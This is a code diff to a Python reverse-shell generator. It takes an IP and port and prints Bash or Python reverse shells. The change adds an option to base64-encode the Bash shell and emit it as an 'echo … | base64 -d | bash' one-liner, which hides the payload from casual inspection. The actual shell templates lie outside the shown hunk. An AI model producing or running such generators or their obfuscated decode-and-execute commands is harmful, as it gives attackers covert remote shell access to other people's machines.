@@ -1,6 +1,7 @@
 import netifaces
 import sys
 import os
+import base64
 
 if len(sys.argv) == 3:
     ip = sys.argv[1]
@@ -27,7 +28,13 @@ choice = int(input("What revshell do you want?\n[1] Bash revshell\n[2] Python re
 if choice == 1:
     bash_shell = bash_shell.replace('IP',ip)
     bash_shell = bash_shell.replace('PORT',port)
-    print(bash_shell)
+    encoded = input("Would you like it to be base64 encoded? (Y/N) ")
+    if encoded == "Y" or encoded == "y":
+        encoded_bash_shell = str(base64.b64encode(bash_shell.encode())).strip("b")
+        print(f"echo -n {encoded_bash_shell} | base64 -d | bash")
+    #print(base64.b64encode(bash_shell.encode()))
+    else:
+        print(bash_shell)
 elif choice == 2:
     python_shell = python_shell.replace('IP',ip)
     python_shell = python_shell.replace('PORT',port)
